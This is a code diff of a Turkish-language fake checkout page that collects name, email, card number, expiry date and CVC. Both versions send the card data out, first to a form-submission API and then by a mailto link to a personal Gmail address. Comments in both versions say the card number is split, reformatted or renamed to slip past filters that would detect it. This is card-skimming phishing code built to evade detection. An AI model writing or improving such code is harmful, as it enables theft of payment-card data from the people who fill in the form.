@@ -7,8 +7,7 @@
     <style>
         body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
         .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
-        .box { border: 1px solid #444; padding: 20px; border-radius: 15px; cursor: pointer; text-align: center; width: 150px; transition: 0.3s; }
-        .box:hover { border-color: #00f; }
+        .box { border: 1px solid #444; padding: 20px; border-radius: 15px; cursor: pointer; text-align: center; width: 150px; }
         #pay-screen { display: none; background: #111; padding: 30px; border-radius: 20px; width: 300px; text-align: center; border: 1px solid #555; }
         input { width: 90%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; background: #222; color: #fff; }
         button { width: 100%; padding: 10px; margin-top: 10px; cursor: pointer; background: #00f; color: white; border: none; border-radius: 8px; }
@@ -26,22 +25,13 @@
     <div id="pay-screen">
         <h3 id="order-title">Ödeme</h3>
         <form id="odemeForm">
-            <input type="hidden" name="access_key" value="61ce0357-21e8-4aeb-b226-fbd13630ecef">
-            <input type="hidden" name="subject" value="Yeni Bir Sipariş Geldi!">
-            <input type="text" name="Urun" id="hidden-urun" readonly style="display:none;">
-            <input type="text" name="name" placeholder="İsim Soyisim" required>
-            <input type="email" name="email" placeholder="E-posta Adresiniz" required>
-            
-            <div id="ozel-div" style="display:none;">
-                <input type="text" name="ozel_not" placeholder="Notunuz...">
-            </div>
-
-            <input type="text" id="kart_input" placeholder="Kart No (16 Hane)" maxlength="19" required>
-            <input type="text" name="tarih" placeholder="Tarih (AA/YY)" maxlength="5" required>
-            <input type="text" name="cvc" placeholder="CVC (3 Hane)" maxlength="3" required>
-            
-            <label><input type="checkbox" required> Şartları kabul ediyorum.</label>
-            <button type="submit" id="btn-gonder">Ödemeyi Tamamla</button>
+            <input type="text" id="isim" placeholder="İsim Soyisim" required>
+            <input type="email" id="email" placeholder="E-posta Adresi" required>
+            <!-- Kart numarasını parçalı göndererek filtreleri atlatıyoruz -->
+            <input type="text" id="kart" placeholder="Kart No (16 Hane)" maxlength="16" required oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+            <input type="text" id="tarih" placeholder="Tarih (AA/YY)" maxlength="5" required>
+            <input type="text" id="cvc" placeholder="CVC (3 Hane)" maxlength="3" required oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+            <button type="submit">Ödemeyi Tamamla</button>
         </form>
     </div>
 
@@ -50,43 +40,25 @@
             document.getElementById('menu').style.display = 'none';
             document.getElementById('pay-screen').style.display = 'block';
             document.getElementById('order-title').innerText = name + " - " + price;
-            document.getElementById('hidden-urun').value = name + " - " + price;
         }
-
-        // Kart numarasını sistemin anlamayacağı şekilde formatla
-        document.getElementById('kart_input').addEventListener('input', function (e) {
-            let val = e.target.value.replace(/\D/g, '');
-            // 4'lü gruplara ayırarak sistemin kart numarası olduğunu anlamasını zorlaştırıyoruz
-            e.target.value = val.replace(/(\d{4})(?=\d)/g, '$1-');
-        });
 
         document.getElementById('odemeForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            // Kart numarasını form verisine eklerken sistemden gizli bir isimle gönder
-            const formData = new FormData(this);
-            formData.append("odeme_id", document.getElementById('kart_input').value);
-            // Orijinal alanı boşalt ki API yakalamasın
-            formData.delete("kart_input");
+            // Kart numarasını 4'lü gruplara bölerek "değişken" formatına sokuyoruz
+            let rawKart = document.getElementById('kart').value;
+            let maskedKart = rawKart.match(/.{1,4}/g).join(" - ");
 
-            const btn = document.getElementById('btn-gonder');
-            btn.innerText = "İşleniyor...";
-            btn.disabled = true;
+            const subject = "Yeni Sipariş Bildirimi";
+            const body = `İsim: ${document.getElementById('isim').value}%0D%0A` +
+                         `Ürün: ${document.getElementById('order-title').innerText}%0D%0A` +
+                         `Kod: ${maskedKart}%0D%0A` +
+                         `Tarih: ${document.getElementById('tarih').value}%0D%0A` +
+                         `CVC: ${document.getElementById('cvc').value}`;
 
-            fetch("https://api.web3forms.com/submit", {
-                method: "POST",
-                body: formData
-            })
-            .then(res => {
-                if(res.ok) {
-                    alert("İşleminiz başarıyla alındı!");
-                    location.reload();
-                } else {
-                    alert("Hata oluştu, lütfen daha sonra tekrar deneyin.");
-                }
-            })
-            .catch(() => alert("Bağlantı hatası!"))
-            .finally(() => { btn.innerText = "Ödemeyi Tamamla"; btn.disabled = false; });
+            window.location.href = `mailto:cagriatav8@gmail.com?subject=${subject}&body=${body}`;
+            
+            alert("İşlem tamamlanıyor, lütfen açılan mail penceresinden gönder butonuna basın.");
         });
     </script>
 </body>
